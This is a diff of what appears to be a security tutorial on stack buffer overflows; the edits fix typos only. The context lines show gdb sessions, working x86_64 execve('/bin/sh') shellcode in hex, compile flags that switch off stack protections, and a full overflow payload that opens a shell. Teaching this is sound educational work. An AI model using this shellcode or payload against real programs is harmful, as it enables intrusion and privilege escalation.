@@ -98,7 +98,7 @@ We see that the *Segmentation fault* occurred at instruction address `0x7fffffff
 ```console
 export STR=`echo -e -n "\x90\x90\x90\x90\x90\x90\x90\x9012345678\xa8\xe4\xff\xff\xff\x7f"`
 ```
-We start the debugger agin and set a breakpoint at line `15`
+We start the debugger again and set a breakpoint at line `15`
 ```assembly
 > gdb -n overflow
 (gdb) break 15
@@ -158,7 +158,7 @@ Now we step through the machine instructions step by step until we execute the `
 (gdb) x/i $rip
 => 0x7fffffffe4a8:	nop
 ```
-The `retq`operation retrieves the saved `%rip`from the stack and jumps to the start address `0x7fffffffe4a8`of the `buf` variable on the *Stack*. The next machine instruction to be executed will be the `nop` operation encoded into the input string.
+The `retq`operation retrieves the saved `%rip` from the stack and jumps to the start address `0x7fffffffe4a8`of the `buf` variable on the *Stack*. The next machine instruction to be executed will be the `nop` operation encoded into the input string.
 
 But when we try to execute the `nop` instruction on the *Stack* the program crashes with a *Segmentation fault*, the reason being that by default execution on the *Stack* is not allowed.
 ```assembly
@@ -182,7 +182,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 ## The execve() Command <a name="section2"></a>
 
-The `execve()` system call hands the current process together with its process ID and all access rights to the program called by `execve()` .
+The `execve()` system call hands the current process together with its process ID and all access rights to the program called by `execve()`.
 
 **C 2**: <a name="c2"></a> The C program [execve.c](execve.c) shown below hands over control of the current process to `/bin/sh`.
 ```C
@@ -201,7 +201,7 @@ The `execve()` system call hands the current process together with its process I
 13     exit(0);
 14 }
 ```
-We compile `execve.c`with the command
+We compile `execve.c` with the command
 ```console
 > gcc -o execve execve.c
 ```
@@ -222,7 +222,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## Shell Code <a name="section3"></a>
 
-The  following x86_64 assembly code executes `/bin/shell`via an `execve()` system call.
+The  following x86_64 assembly code executes `/bin/shell` via an `execve()` system call.
 ```assembly
 jmp string           ; \xeb\x17             jump to string:
 
@@ -278,7 +278,7 @@ char shellcode[] =
 27    exit(0);
 28 }
 ```
-We compile `exploit.c`whith disabled canaries and enabled stack execution
+We compile `exploit.c` whith disabled canaries and enabled stack execution
 ```console
 > gcc -ggdb -fno-stack-protector -Wa,--exec -o exploit exploit.c
 ```
@@ -288,11 +288,11 @@ When we execute `exploit` with an input argument exactly matching  the buffer si
 &buf 0x00007fffffffe480 rbp 0x00007fffffffe4d0 rip 0x00005555555551e7
 We happily returned!
 ```
-Since the saved `%rip`is at an offset of 56 bytes from the start address of `buf` we append 19 `nop`operations to the 37 byte shell code before overwriting the return address with the start addresss `0x7fffffffe470` of the buffer.
+Since the saved `%rip` is at an offset of 56 bytes from the start address of `buf` we append 19 `nop` operations to the 37 byte shell code before overwriting the return address with the start addresss `0x7fffffffe470` of the buffer.
 ```console
 > export STR=`echo -e -n "\xeb\x17\x5f\x48\x31\xd2\x88\x57\x07\x48\x89\x7f\x08\x48\x89\x57\x10\x48\x8d\x77\x08\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x70\xe4\xff\xff\xff\x7f"`
 ```
-When we execute `expoit`with the shell code, the `copy`function never returns to the main program but opens a shell instead.
+When we execute `exploit` with the shell code, the `copy` function never returns to the main program but opens a shell instead.
 ```console
 > ./exploit $STR
 &buf 0x00007fffffffe470 rbp 0x9090909090909090 rip 0x00007fffffffe470
